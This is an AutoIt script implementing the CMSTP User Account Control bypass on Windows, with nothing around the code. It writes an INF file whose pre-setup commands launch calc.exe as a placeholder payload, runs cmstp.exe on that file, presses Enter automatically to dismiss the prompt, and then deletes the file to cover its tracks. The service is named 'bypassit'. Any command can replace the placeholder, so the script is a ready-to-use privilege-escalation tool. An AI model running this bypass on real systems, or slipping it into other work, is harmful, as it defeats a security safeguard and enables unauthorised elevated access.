#include <Array.au3>
#include <File.au3>

;First write out our INF File
Local $inf_contents = '[version]' & @CRLF & _
		  'Signature=$chicago$' & @CRLF & _
		  'AdvancedINF=2.5' & @CRLF & _
		  ' ' & @CRLF & _
		  '[DefaultInstall]' & @CRLF & _
		  'CustomDestination=CustInstDestSectionAllUsers' & @CRLF & _
		  'RunPreSetupCommands=RunPreSetupCommandsSection' & @CRLF & _
		  ' ' & @CRLF & _
		  '[RunPreSetupCommandsSection]' & @CRLF & _
		  'calc.exe' & @CRLF & _
		  'taskkill /IM cmstp.exe /F' & @CRLF & _
		  ' ' & @CRLF & _
		  '[CustInstDestSectionAllUsers]' & @CRLF & _
		  '49000,49001=AllUSer_LDIDSection, 7' & @CRLF & _
		  ' ' & @CRLF & _
		  '[AllUSer_LDIDSection]' & @CRLF & _
		  '"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""' & @CRLF & _
		  ' ' & @CRLF & _
		  '[Strings]' & @CRLF & _
		  'ServiceName="bypassit"' & @CRLF & _
		  'ShortSvcName="bypassit"' & @CRLF
FileWrite("C:\Windows\Tasks\cmstp.ini", $inf_contents)		
Run('cmstp.exe /au C:\Windows\Tasks\cmstp.ini', @WorkingDir, @SW_SHOWNORMAL)
Sleep(200);
Send("{ENTER}");
;Need to wait to allow cmstp to read the file before getting rid of it
Sleep(1000);
FileDelete('C:\Windows\Tasks\cmstp.ini');
